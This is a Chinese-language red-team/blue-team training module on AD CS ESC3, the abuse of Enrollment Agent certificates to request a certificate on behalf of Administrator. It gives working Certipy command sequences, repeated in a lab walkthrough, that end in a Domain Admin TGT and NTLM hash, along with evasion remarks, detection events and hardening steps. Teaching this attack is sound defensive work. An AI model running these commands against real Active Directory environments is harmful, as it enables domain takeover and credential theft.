# R17.3 憑證註冊代理人代簽發機制濫用分析 (Enrollment Agent On-Behalf-Of / ESC3)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**憑證註冊代理人 (Enrollment Agent) 代簽發機制濫用 (AD CS ESC3)** 是利用企業「代簽委派機制」進行的雙範本鏈式提權攻擊。其本質為：**「企業 CA 允許配置了『憑證要求代理人 (Certificate Request Agent, OID: `1.3.6.1.4.1.311.20.2.1`)』EKU 的憑證代表其他使用者申請憑證；當環境中存在一個允許低權限用戶申請的註冊代理人範本，且同時存在第二個允許代理簽名並支援用戶端身分驗證的目標範本時，攻擊者可先取得代理人憑證，隨後代表網域管理員簽署二次請求，達成全域提權」**。

```
[低權限用戶 (operator)] ── 1. 申請範本 A (具備 Certificate Request Agent EKU) ──► [企業 CA]
                                                                                      │
                                                                                      ▼ 註冊權限對全員開放
                                                                              [簽發 agent.pfx]
                                                                                      │
[攻擊者控制台] ◄── 2. 獲取具備代簽特權之代理人憑證 ──────────────────────────────────┘
       │
       ├── 3. 構造 On-Behalf-Of CSR (代表 Administrator)，並以 agent.pfx 進行數位簽名
       ▼
[提交至範本 B (支援 Client Auth 且要求代理簽章)] ──► [企業 CA 驗證代理簽章通過] ➔ 簽發 admin.pfx
       │
       ▼ 4. 利用 admin.pfx 發起 Kerberos PKINIT ➔ 換取 Domain Admin TGT！
```

### 核心作戰決策與邊界
- **ESC3 雙範本核心條件**：
  - **範本 A (Agent 範本)**：開放註冊權限給低權限用戶，EKU 包含 `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`)，無管理員審批。
  - **範本 B (目標用戶範本)**：具備 `Client Authentication` EKU，發行需求中要求授權簽章 (Authorized Signature) 且限定 Application Policy 為 `Certificate Request Agent`（或為無需簽章的 Schema V1 範本），註冊權限允許低權限用戶。
- **技術邊界**：
  - **與 ESC1 差異**：ESC1 依賴範本直接允許在 CSR 指定 SAN；ESC3 範本不需要自訂 SAN，完全依賴合法的「代理人代簽 (On-Behalf-Of)」機制產生目標用戶憑證。

## 🔬 第一動：註冊代理人 (Enrollment Agent) 信任模型全景解剖 (Mechanics & EA Semantics)

### 關鍵 EKU 與授權簽章屬性速查表

| 屬性名稱 (AD Attribute) | 規格數值與旗標 | 語意與底層行為 |
| :--- | :--- | :--- |
| **`pKIExtendedKeyUsage`** | `1.3.6.1.4.1.311.20.2.1` | 宣告本憑證為 `szOID_ENROLLMENT_AGENT`，可充當註冊代理人 |
| **`msPKI-RA-Signature`** | `1` (或大於 0) | 目標範本要求必須由至少 1 個具備特定原則的已簽名憑證聯署 |
| **`msPKI-RA-Policies`** | `1.3.6.1.4.1.311.20.2.1` | 授權簽章的憑證必須具備「憑證要求代理人」應用程式原則 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy)

#### 1. 探測 ESC3 弱點範本組合
```bash
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢查輸出中標記 [!] Vulnerabilities: ESC3 的範本組合
```

#### 2. 第一步：申請註冊代理人憑證 (範本 A)
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "EnrollmentAgentTemplate" -dc-ip 10.0.0.1
# 輸出: operator.pfx
```

#### 3. 第二步：以代理人憑證聯署，代表 Administrator 申請用戶憑證 (範本 B)
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "UserTemplate" -on-behalf-of "corp.internal\Administrator" \
    -pfx operator.pfx -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 4. 第三步：PKINIT 票據換取
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# 輸出: Administrator TGT 票據與 NTLM Hash
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **防禦規避策略**：
  - 攻擊者在申請註冊代理人憑證時使用自身合法帳號，完全符合合規簽發流程；第二步代簽是微軟官方正規支援的智慧卡發行功能，常規特徵比對難以區分正常業務代簽與惡意利用。
- **鑑識與遙測特徵**：
  - **CA 審計事件 (Event ID 4887)**：簽發事件中，憑證的發起者 (`Requester`) 為普通用戶，但證書主體 (`Subject`) 為高權限管理員，且延伸屬性中包含代理人簽名。
  - **DC 登入事件 (Event ID 4768)**：非智慧卡部署的常規辦公環境突然出現 Administrator 帳號使用 PreAuth 16 (PKINIT) 憑證登入。

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 範本安全權限收斂 (Security Tab)
- 檢查所有包含 `Certificate Request Agent` 的憑證範本；
- **嚴格自安全性分頁中移除 `Domain Users`、`Authenticated Users`、`Everyone`**，僅允許特定的網域管理員安全小組註冊。

### 2. 配置 CA 註冊代理人限制 (Enrollment Agent Restrictions)
在 CA 伺服器 MMC 管理主控台：
1. 右鍵點擊 CA 伺服器 ➔ **內容 (Properties)** ➔ **Enrollment Agents (註冊代理人)** 分頁；
2. 勾選 **`Restrict enrollment agents (限制註冊代理人)`**；
3. 明確指定只有特定成員可以充當代理人，並在使用者清單中**徹底將 Domain Admins、Enterprise Admins 與核心服務帳號列為禁止代簽對象**。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **CA**：`CORP-CA01`
- **範本 A**：`AgentCert` (包含 Certificate Request Agent EKU)
- **範本 B**：`ClientCert` (要求 1 個授權簽名，具備 Client Auth)

### 2. 三步驗證流程

1. **申請代理人憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA01" \
       -template "AgentCert" -dc-ip 10.0.0.1
   # 成功獲得 user1.pfx
   ```
2. **代表 Administrator 代簽申請目標憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA01" \
       -template "ClientCert" -on-behalf-of "corp.internal\Administrator" \
       -pfx user1.pfx -dc-ip 10.0.0.1
   # 成功獲得 Administrator.pfx
   ```
3. **驗證憑證換取 TGT**：
   ```bash
   certipy auth -pfx Administrator.pfx -dc-ip 10.0.0.1
   # 成功換取 Administrator TGT，證實代簽鏈式提權成立！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 什麼是憑證要求代理人 (Certificate Request Agent)？其合法業務用途為何？**  
  *分析思路*：註冊代理人是微軟設計供人事或 IT 維運人員為新員工大量代辦發行智慧卡 (Smartcard) 的合法機制；代理人代為簽署憑證申請，讓員工不必親自具備高權限即可獲得登入憑證。

- [ ] **Q2. ESC3 攻擊為何必須依賴「兩個範本」協同運作？**  
  *分析思路*：因為單一註冊代理人範本本身無法直接用於 Windows 網域登入（缺少 Client Auth EKU）；攻擊者必須先取得代理人憑證（範本 A），再用它去向另一個支援 Client Auth 且接受代簽的範本（範本 B）代簽管理員憑證。

- [ ] **Q3. 什麼是「授權簽章 (Authorized Signatures)」要求？**  
  *分析思路*：憑證範本發行需求中的一項防護；規定客戶端在提交 CSR 時，CSR 必須被已存在的合法憑證（如特定 EKU 的代理人憑證）進行額外的數位簽署聯署，CA 才允許簽發。

- [ ] **Q4. 藍隊如何阻斷任何註冊代理人為「網域管理員」代簽憑證？**  
  *分析思路*：在 CA 內容中啟用「註冊代理人限制 (Enrollment Agent Restrictions)」；將 `Domain Admins` 群組列入代理人的排除名單中，使 CA 直接拒絕任何針對管理員的代簽請求。

- [ ] **Q5. 徹底根治 ESC3 攻擊的最直接防禦措施是什麼？**  
  *分析思路*：立即清查所有具備 `1.3.6.1.4.1.311.20.2.1` EKU 的範本，撤銷一般使用者的註冊權限；對於不需要代簽的常規用戶範本，發行需求中禁止設定代理人簽名原則。
